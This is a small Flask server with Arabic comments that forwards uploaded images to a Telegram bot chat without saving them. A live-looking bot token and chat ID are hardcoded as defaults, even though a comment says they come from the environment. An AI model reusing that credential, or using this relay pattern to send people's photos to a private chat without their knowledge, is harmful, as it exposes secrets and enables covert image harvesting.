import os
import io
from flask import Flask, request, jsonify
from werkzeug.utils import secure_filename
import httpx

app = Flask(__name__)

# استخراج التوكن ومعرف الشات من متغيرات البيئة لضمان الأمان
TOKEN = os.getenv('TELEGRAM_TOKEN','8619489316:AAGVG6IrKXWUFaleUS0KFh113d0U31CYL74')
CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '8797738653')

@app.route('/')
def index():
    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return jsonify({"error": "index.html not found"}), 404

@app.route('/upload', methods=['POST'])
def upload():
    if 'image' not in request.files:
        return jsonify({"status": "error", "message": "No image provided"}), 400
        
    file = request.files['image']
    if file.filename == '':
        return jsonify({"status": "error", "message": "No selected file"}), 400

    filename = secure_filename(file.filename)
    
    # القراءة في الذاكرة مباشرة دون الحفظ على القرص
    file_bytes = file.read()
    
    url = f'https://api.telegram.org/bot{TOKEN}/sendPhoto'
    
    try:
        with httpx.Client(timeout=10.0) as client:
            files = {'photo': (filename, io.BytesIO(file_bytes), file.content_type)}
            data = {'chat_id': CHAT_ID}
            response = client.post(url, files=files, data=data)
            
            if response.status_code == 200:
                return jsonify({"status": "success"}), 200
            else:
                return jsonify({"status": "failed", "details": response.text}), 500
                
    except Exception as e:
        return jsonify({"status": "error", "exception": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
